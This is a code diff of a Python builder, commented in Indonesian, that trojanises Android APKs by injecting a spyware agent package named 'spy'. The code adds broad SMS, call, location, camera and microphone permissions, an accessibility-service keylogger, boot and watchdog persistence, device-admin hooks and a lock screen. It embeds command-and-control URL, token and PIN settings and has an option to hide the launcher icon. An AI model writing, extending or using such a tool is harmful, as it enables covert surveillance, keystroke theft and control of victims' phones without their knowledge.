@@ -4,20 +4,14 @@ from __future__ import annotations
 import re
 import secrets
 import shutil
+import zipfile
 from pathlib import Path
 
 PERMISSIONS = [
-    "android.permission.SEND_SMS",
-    "android.permission.CALL_PHONE",
-    "android.permission.CHANGE_WIFI_STATE",
-    "android.permission.WRITE_SETTINGS",
-    "android.permission.REQUEST_INSTALL_PACKAGES",
-    "android.permission.REQUEST_DELETE_PACKAGES",
-    "android.permission.REBOOT",
-    "android.permission.LOCKED_BOOT_COMPLETED",
     "android.permission.INTERNET",
     "android.permission.ACCESS_NETWORK_STATE",
     "android.permission.ACCESS_WIFI_STATE",
+    "android.permission.CHANGE_WIFI_STATE",
     "android.permission.ACCESS_FINE_LOCATION",
     "android.permission.ACCESS_COARSE_LOCATION",
     "android.permission.ACCESS_BACKGROUND_LOCATION",
@@ -26,31 +20,52 @@ PERMISSIONS = [
     "android.permission.MODIFY_AUDIO_SETTINGS",
     "android.permission.READ_CONTACTS",
     "android.permission.READ_SMS",
+    "android.permission.SEND_SMS",
     "android.permission.RECEIVE_SMS",
     "android.permission.READ_CALL_LOG",
+    "android.permission.CALL_PHONE",
     "android.permission.READ_PHONE_STATE",
     "android.permission.READ_PHONE_NUMBERS",
     "android.permission.READ_EXTERNAL_STORAGE",
     "android.permission.WRITE_EXTERNAL_STORAGE",
     "android.permission.READ_MEDIA_IMAGES",
     "android.permission.READ_MEDIA_VIDEO",
+    "android.permission.READ_MEDIA_AUDIO",
     "android.permission.POST_NOTIFICATIONS",
     "android.permission.SET_WALLPAPER",
+    "android.permission.WRITE_SETTINGS",
+    "android.permission.REQUEST_INSTALL_PACKAGES",
+    "android.permission.REQUEST_DELETE_PACKAGES",
     "android.permission.FOREGROUND_SERVICE",
     "android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION",
     "android.permission.FOREGROUND_SERVICE_CAMERA",
     "android.permission.FOREGROUND_SERVICE_MICROPHONE",
     "android.permission.FOREGROUND_SERVICE_LOCATION",
+    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
     "android.permission.WAKE_LOCK",
     "android.permission.RECEIVE_BOOT_COMPLETED",
+    "android.permission.LOCKED_BOOT_COMPLETED",
     "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
     "android.permission.SYSTEM_ALERT_WINDOW",
     "android.permission.QUERY_ALL_PACKAGES",
     "android.permission.VIBRATE",
-    "android.permission.READ_MEDIA_AUDIO",
+    "android.permission.REBOOT",
 ]
 
 PKG = "ai.m4zk1play.spy"
+ALIAS = f"{PKG}.Launcher"
+
+BOOT_ACTIONS = [
+    "android.intent.action.BOOT_COMPLETED",
+    "android.intent.action.LOCKED_BOOT_COMPLETED",
+    "android.intent.action.MY_PACKAGE_REPLACED",
+    "android.intent.action.QUICKBOOT_POWERON",
+    "com.htc.intent.action.QUICKBOOT_POWERON",
+    "android.intent.action.USER_PRESENT",
+    "android.net.conn.CONNECTIVITY_CHANGE",
+    "android.intent.action.TIME_SET",
+    "android.intent.action.TIMEZONE_CHANGED",
+]
 
 
 def _dex_numbers(decoded: Path) -> list[int]:
@@ -63,52 +78,104 @@ def _dex_numbers(decoded: Path) -> list[int]:
 
 
 def inject_dex(decoded: Path, agent_apk: Path) -> int:
-    """Salin semua dex agent sebagai dex lanjutan. Kembalikan jumlah dex disalin."""
+    """Salin semua dex agent sebagai dex lanjutan."""
     if not agent_apk.exists():
         raise FileNotFoundError(
-            "agent/prebuilt/agent.apk tidak ada. Build dulu agent atau jalankan ./install.sh --agent"
+            "agent/prebuilt/agent.apk tidak ada. Jalankan ./scripts/build-agent.sh"
         )
     used = _dex_numbers(decoded)
     nxt = (max(used) if used else 1) + 1
-    import zipfile
 
     copied = 0
     with zipfile.ZipFile(agent_apk) as z:
-        names = [n for n in z.namelist() if re.fullmatch(r"classes(\d*)\.dex", n)]
-        for name in sorted(names):
+        names = sorted(n for n in z.namelist() if re.fullmatch(r"classes(\d*)\.dex", n))
+        if not names:
+            raise RuntimeError("agent.apk tidak berisi dex")
+        for name in names:
             (decoded / f"classes{nxt}.dex").write_bytes(z.read(name))
             nxt += 1
             copied += 1
     return copied
 
 
-def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
-                   email: str, team: str, hide: bool) -> None:
-    mf = decoded / "AndroidManifest.xml"
-    xml = mf.read_text(encoding="utf-8")
-
-    # 1. permission
+def _add_permissions(xml: str) -> str:
+    anchor = re.search(r"<application\b", xml)
+    if anchor is None:
+        raise RuntimeError("AndroidManifest.xml tanpa tag <application>")
+    block = ""
     for perm in PERMISSIONS:
         if f'android:name="{perm}"' in xml:
             continue
-        xml = xml.replace(
-            "<application",
-            f'    <uses-permission android:name="{perm}" />\n    <application',
-            1,
-        )
+        block += f'    <uses-permission android:name="{perm}" />\n'
+    if not block:
+        return xml
+    return xml[: anchor.start()] + block + xml[anchor.start():]
 
-    authority = f"{PKG}.boot.{secrets.token_hex(4)}"
-    injection = f"""
-        <provider
-            android:name="{PKG}.BootProvider"
-            android:authorities="{authority}"
+
+def _legacy_storage(xml: str) -> str:
+    if "requestLegacyExternalStorage" in xml:
+        return xml
+    return re.sub(
+        r"<application\b",
+        '<application android:requestLegacyExternalStorage="true"',
+        xml, count=1,
+    )
+
+
+def _injection(authority: str) -> str:
+    boot = "\n".join(
+        f'                <action android:name="{a}" />' for a in BOOT_ACTIONS
+    )
+    return f"""
+        <activity
+            android:name="{PKG}.MainActivity"
+            android:exported="true"
+            android:theme="@style/MzkTheme"
+            android:launchMode="singleTop" />
+
+        <activity
+            android:name="{PKG}.LockActivity"
             android:exported="false"
-            android:enabled="true" />
+            android:theme="@style/MzkLockTheme" />
+
+        <activity
+            android:name="{PKG}.PlayerActivity"
+            android:exported="false"
+            android:theme="@style/MzkTheme" />
+
+        <activity-alias
+            android:name="{ALIAS}"
+            android:targetActivity="{PKG}.MainActivity"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <service
             android:name="{PKG}.AgentService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="mediaProjection|camera|microphone|location|dataSync" />
+
+        <service
+            android:name="{PKG}.Watchdog$Job"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name="{PKG}.KeylogService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/mzk_accessibility" />
+        </service>
 
         <service
             android:name="{PKG}.NotifListener"
@@ -119,6 +186,39 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
             </intent-filter>
         </service>
 
+        <provider
+            android:name="{PKG}.BootProvider"
+            android:authorities="{authority}"
+            android:exported="false"
+            android:enabled="true" />
+
+        <provider
+            android:name="{PKG}.MzkFiles"
+            android:authorities="{authority}.files"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/mzk_file_paths" />
+        </provider>
+
+        <receiver
+            android:name="{PKG}.BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter android:priority="900">
+{boot}
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="{PKG}.Watchdog"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="{PKG}.TICK" />
+            </intent-filter>
+        </receiver>
+
         <receiver
             android:name="{PKG}.AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -128,97 +228,72 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
                 android:resource="@xml/mzk_device_admin" />
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
             </intent-filter>
         </receiver>
-
-        <receiver
-            android:name="{PKG}.Keys"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-            </intent-filter>
-        </receiver>
-
-        <activity
-            android:name="{PKG}.LockActivity"
-            android:exported="false"
-            android:theme="@style/MzkLockTheme" />
 """
 
-    if hide:
-        injection += f"""
-        <service
-            android:name="{PKG}.KeylogService"
-            android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/mzk_accessibility" />
-        </service>
 
-        <service
-            android:name="{PKG}.Watchdog$Job"
-            android:exported="false"
-            android:permission="android.permission.BIND_JOB_SERVICE" />
-
-        <receiver android:name="{PKG}.Watchdog" android:exported="false">
-            <intent-filter>
-                <action android:name="{PKG}.TICK" />
-            </intent-filter>
-        </receiver>
-
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="{authority}.files"
-            android:exported="false"
-            android:grantUriPermissions="true">
-            <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/mzk_file_paths" />
-        </provider>
-"""
-        <activity-alias
-            android:name="{PKG}.Launcher"
-            android:targetActivity="{PKG}.MainActivity"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-"""
-    else:
-        injection += f"""
-        <activity
-            android:name="{PKG}.MainActivity"
-            android:exported="true"
-            android:theme="@style/MzkTheme" />
-"""
-
-    xml = xml.replace("</application>", injection + "    </application>", 1)
-    mf.write_text(xml, encoding="utf-8")
-
-    # 2. meta-data konfigurasi C2 di dalam manifest (dibaca agent saat runtime)
-    meta = (
+def _meta(c2_url: str, token: str, pin: str, email: str, team: str) -> str:
+    return (
         f'\n        <meta-data android:name="mzk.c2" android:value="{c2_url}" />'
         f'\n        <meta-data android:name="mzk.token" android:value="{token}" />'
         f'\n        <meta-data android:name="mzk.pin" android:value="{pin}" />'
         f'\n        <meta-data android:name="mzk.email" android:value="{email}" />'
         f'\n        <meta-data android:name="mzk.team" android:value="{team}" />'
     )
-    xml = mf.read_text(encoding="utf-8").replace("</application>", meta + "\n    </application>", 1)
+
+
+def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
+                   email: str, team: str, hide: bool) -> None:
+    mf = decoded / "AndroidManifest.xml"
+    xml = mf.read_text(encoding="utf-8")
+
+    if "</application>" not in xml:
+        raise RuntimeError("AndroidManifest.xml tidak lengkap")
+
+    xml = _add_permissions(xml)
+    xml = _legacy_storage(xml)
+
+    authority = f"{PKG}.boot.{secrets.token_hex(4)}"
+    xml = xml.replace("</application>", _injection(authority) + "    </application>", 1)
+    xml = xml.replace("</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1)
+
+    if hide:
+        xml = re.sub(
+            rf'(<activity-alias\s+android:name="{re.escape(ALIAS)}"[^>]*?)android:enabled="true"',
+            r'\1android:enabled="false"',
+            xml, count=1,
+        )
+
     mf.write_text(xml, encoding="utf-8")
 
 
+A11Y_XML = (
+    '<?xml version="1.0" encoding="utf-8"?>\n'
+    '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"\n'
+    '    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused|typeViewClicked|typeWindowStateChanged"\n'
+    '    android:accessibilityFeedbackType="feedbackGeneric"\n'
+    '    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"\n'
+    '    android:canRetrieveWindowContent="true"\n'
+    '    android:notificationTimeout="120" />\n'
+)
+
+PATHS_XML = (
+    '<?xml version="1.0" encoding="utf-8"?>\n'
+    "<paths>"
+    '<cache-path name="c" path="." />'
+    '<files-path name="f" path="." />'
+    '<external-path name="e" path="." />'
+    "</paths>\n"
+)
+
+
 def inject_assets(decoded: Path) -> None:
-    """Salin resource pendukung (xml admin, style) ke hasil decode."""
+    """Resource pendukung yang dirujuk manifest."""
     res_xml = decoded / "res" / "xml"
     res_xml.mkdir(parents=True, exist_ok=True)
+
     (res_xml / "mzk_device_admin.xml").write_text(
         '<?xml version="1.0" encoding="utf-8"?>\n'
         '<device-admin xmlns:android="http://schemas.android.com/apk/res/android">\n'
@@ -228,11 +303,12 @@ def inject_assets(decoded: Path) -> None:
         "</device-admin>\n",
         encoding="utf-8",
     )
+    (res_xml / "mzk_accessibility.xml").write_text(A11Y_XML, encoding="utf-8")
+    (res_xml / "mzk_file_paths.xml").write_text(PATHS_XML, encoding="utf-8")
 
     values = decoded / "res" / "values"
     values.mkdir(parents=True, exist_ok=True)
-    styles = values / "mzk_styles.xml"
-    styles.write_text(
+    (values / "mzk_styles.xml").write_text(
         '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
         '  <style name="MzkTheme" parent="android:Theme.Material.NoActionBar">\n'
         '    <item name="android:statusBarColor">#05060a</item>\n'
@@ -248,8 +324,7 @@ def inject_assets(decoded: Path) -> None:
 
 
 def ensure_package_dir(decoded: Path) -> Path:
-    smali_root = decoded / "smali"
-    target = smali_root / PKG.replace(".", "/")
+    target = decoded / "smali" / PKG.replace(".", "/")
     if target.exists():
         shutil.rmtree(target)
     target.mkdir(parents=True, exist_ok=True)
